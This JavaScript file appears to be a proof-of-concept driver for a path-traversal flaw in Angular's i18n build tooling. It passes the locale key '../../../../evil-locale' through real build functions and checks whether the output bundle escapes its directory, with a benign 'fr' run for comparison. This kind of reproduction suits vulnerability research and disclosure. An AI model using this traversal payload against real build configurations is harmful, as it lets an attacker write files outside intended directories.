// N1-D final driver: REAL createI18nOptions + REAL BundleActionExecutor(Piscina->pb.worker.cjs)
// + the configureI18nBuild locale-data loop VERBATIM (i18n-webpack.ts:57-89) + findLocaleDataPath VERBATIM (:145-153)
import { createRequire } from 'node:module';
import fs from 'node:fs';
import path from 'node:path';

const FIXTURE = path.join(import.meta.dirname, 'fixture');
const EMITTED = path.join(import.meta.dirname, 'emitted');
// --- REAL createI18nOptions (bundled from packages/angular/build/src/utils/i18n-options.ts) ---
const { createI18nOptions } = await import(path.join(import.meta.dirname, 'i18n-options.bundle.mjs'));

// --- REAL BundleActionExecutor (bundled from action-executor.ts; worker patched to pb.worker.cjs) ---
const { createRequire: _cr } = await import('node:module');
const execMod = _cr(import.meta.url)(path.join(import.meta.dirname, 'executor.cjs'));

const LOCALE_DATA_BASE_MODULE = '@angular/common/locales/global';

// VERBATIM findLocaleDataPath (i18n-webpack.ts:145-153)
function findLocaleDataPath(locale, resolver) {
  const scrubbedLocale = locale.replace(/-x(-[a-zA-Z0-9]{1,8})+$/, '');
  try {
    return resolver(scrubbedLocale);
  } catch {
    return scrubbedLocale === 'en-US' ? findLocaleDataPath('en', resolver) : null;
  }
}

const silentLogger = { info(){}, debug(){}, warn(){}, error(){}, fatal(){} };

async function run(mode) {
  const malicious = mode === 'malicious';
  const locale = malicious ? '../../../../evil-locale' : 'fr';
  const metadata = { root: '.', i18n: { locales: { [locale]: { translation: malicious ? 'evil.xlf' : 'fr.xlf' } } } };

  // REAL createI18nOptions (metadata, localize, logger) — the key becomes subPath UNVALIDATED
  const i18n = createI18nOptions(metadata, [locale], silentLogger);
  console.log(`[${mode}] createI18nOptions: sourceLocale=${i18n.sourceLocale} inlineLocales=${JSON.stringify([...i18n.inlineLocales])}`);
  console.log(`[${mode}] locales[${JSON.stringify(locale)}].subPath = ${JSON.stringify(i18n.locales[locale].subPath)} (the KEY, unvalidated)`);

  // VERBATIM configureI18nBuild locale-data loop (i18n-webpack.ts:57-89)
  const projectRoot = path.join(FIXTURE, '.');
  const projectRequire = createRequire(projectRoot + '/');
  const localeResolver = (l) => projectRequire.resolve(path.join(LOCALE_DATA_BASE_MODULE, l));
  for (const [l, desc] of Object.entries(i18n.locales)) {
    if (!i18n.inlineLocales.has(l) && l !== i18n.sourceLocale) continue;
    let localeDataPath = findLocaleDataPath(l, localeResolver);
    if (!localeDataPath) {
      const [first] = l.split('-');
      if (first) localeDataPath = findLocaleDataPath(first.toLowerCase(), localeResolver);
    }
    if (!localeDataPath) {
      console.log(`[${mode}] locale ${JSON.stringify(l)}: no locale data`);
    } else {
      desc.dataPath = localeDataPath;
      console.log(`[${mode}] locale ${JSON.stringify(l)}: dataPath -> ${localeDataPath}`);
    }
  }

  // REAL executor.inline (Piscina worker runs the REAL process-bundle inlineLocales)
  const code = fs.readFileSync(path.join(EMITTED, 'main.js'), 'utf8');
  const action = {
    filename: 'main.js',
    code,
    outputPath: path.join(import.meta.dirname, 'out', mode, 'builder-tmp', '1', '2', '3', '4'), // builder temp output; the KEY escape lands 4-up
    missingTranslation: 'ignore',
    setLocale: true,
  };
  // Mirror ensureOutputPaths(baseOutputPath, i18n) — the builder pre-creates the per-locale
  // output dirs (server/index.ts:110) BEFORE the inliner writes; the escaped key dir is created too.
  const subPath0 = i18n.locales[[...i18n.inlineLocales][0]].subPath;
  const outBase = path.join(import.meta.dirname, 'out', mode, 'builder-tmp', '1', '2', '3', '4');
  fs.mkdirSync(path.join(outBase, i18n.flatOutput ? '' : subPath0), { recursive: true });
  const executor = new execMod.BundleActionExecutor({ i18n });
  const res = await executor.inline(action);
  console.log(`[${mode}] executor.inline -> ${JSON.stringify(res)}`);

  // Locate the produced file (process-bundle writes to outputPath + subPath + filename)
  const subPath = i18n.locales[[...i18n.inlineLocales][0]].subPath;
  const joined = path.join(action.outputPath, i18n.flatOutput ? '' : subPath, 'main.js');
  const real = (() => { try { return fs.realpathSync(joined); } catch { return joined; } })();
  console.log(`[${mode}] written (raw join): ${joined}`);
  console.log(`[${mode}] realpath: ${real} | exists=${fs.existsSync(real)}`);
  // Read back the produced bundle head
  if (fs.existsSync(real)) {
    const out = fs.readFileSync(real, 'utf8');
    console.log(`[${mode}] produced bundle first 300 chars:\n${out.slice(0, 300)}`);
    // copy into the kit out/ dir
    const runDir = path.join(import.meta.dirname, 'out');
    fs.mkdirSync(runDir, { recursive: true });
    fs.writeFileSync(path.join(runDir, `${mode}-main.js`), out);
    console.log(`[${mode}] copied to ${path.join(runDir, `${mode}-main.js`)}`);
  }
  return { i18n, res, real, joined };
}

const mode = process.argv[2] || 'malicious';
run(mode).then(() => process.exit(0)).catch(e => { console.error('FATAL', e); process.exit(1); });
